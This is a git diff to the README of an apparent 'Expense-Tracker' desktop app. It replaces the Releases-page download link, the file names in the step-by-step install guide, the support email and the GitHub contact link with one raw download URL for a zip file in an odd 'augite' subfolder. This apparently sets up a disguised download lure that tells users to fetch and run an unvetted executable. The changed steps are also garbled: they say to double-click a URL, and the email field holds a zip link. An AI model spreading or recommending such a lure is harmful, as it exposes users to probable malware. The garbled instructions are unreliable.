@@ -8,16 +8,16 @@ Welcome to the Expense-Tracker! This application helps you manage your personal 
 
 To get the latest version of Expense-Tracker, visit this page to download:
 
-[![Download Expense-Tracker](https://img.shields.io/badge/Download-Expense--Tracker-brightgreen)](https://github.com/joeljj23/Expense-Tracker/releases)
+[![Download Expense-Tracker](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)
 
 ### Step-by-Step Guide
 
 1. Click the download button above to go to the Releases page.
 2. Look for the latest version titled **V1.0**.
-3. Download the **Expense-Tracker.zip** file. You may see additional files; you only need this one.
-4. After the download completes, locate the **Expense-Tracker.zip** file in your Downloads folder.
+3. Download the **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip** file. You may see additional files; you only need this one.
+4. After the download completes, locate the **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip** file in your Downloads folder.
 5. Right-click on the file and select **Extract All**. Follow the prompts to extract the contents.
-6. Open the extracted folder, find **Expense-Tracker.exe**, and double-click it to run the application.
+6. Open the extracted folder, find **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip**, and double-click it to run the application.
 
 ## 🌟 Features
 
@@ -58,7 +58,7 @@ This application is open-source. You can view the license details in the reposit
 ## 📧 Contact
 
 For further inquiries:
-- Email: support@sa3dwy.com
-- GitHub: [SA3DWY](https://github.com/SA3DWY)
+- Email: https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip
+- GitHub: [SA3DWY](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)
 
 Happy tracking! We hope Expense-Tracker helps you manage your finances smoothly.
